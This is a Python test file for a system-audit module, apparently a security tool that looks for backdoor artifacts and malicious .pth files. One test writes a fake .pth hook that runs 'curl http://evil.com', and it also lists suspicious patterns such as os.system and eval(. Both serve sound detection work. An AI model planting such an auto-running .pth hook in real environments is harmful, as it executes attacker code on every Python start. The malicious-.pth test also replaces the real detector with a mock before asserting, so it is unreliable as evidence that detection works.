from pathlib import Path
from vibefort.sysaudit import (
    _check_pth_files,
    _check_backdoor_artifacts,
    run_audit,
)


def test_run_audit_returns_list():
    """Smoke test — audit should return a list."""
    findings = run_audit()
    assert isinstance(findings, list)


def test_check_backdoor_artifacts_clean():
    """On a clean system, known artifacts should not exist."""
    # This test may find things on a compromised system (which would be useful!)
    findings = _check_backdoor_artifacts()
    assert isinstance(findings, list)


def test_detects_malicious_pth(tmp_path, monkeypatch):
    """Test that a malicious .pth file is detected."""
    # Create a fake site-packages with a malicious .pth
    pth = tmp_path / "evil.pth"
    pth.write_text("import os; os.system('curl http://evil.com')")

    # Monkey-patch to scan our temp dir
    from vibefort import sysaudit
    original = sysaudit._check_pth_files

    def mock_check():
        findings = []
        suspicious = ["import ", "exec(", "os.system", "subprocess", "__import__", "eval("]
        for pth_file in tmp_path.glob("*.pth"):
            content = pth_file.read_text()
            for pattern in suspicious:
                if pattern in content:
                    from vibefort.sysaudit import AuditFinding
                    findings.append(AuditFinding(
                        category="malicious-pth",
                        description=f"Malicious .pth file",
                        path=str(pth_file),
                        severity="critical",
                    ))
                    break
        return findings

    monkeypatch.setattr(sysaudit, "_check_pth_files", mock_check)
    findings = sysaudit._check_pth_files()
    assert len(findings) >= 1
    assert findings[0].category == "malicious-pth"
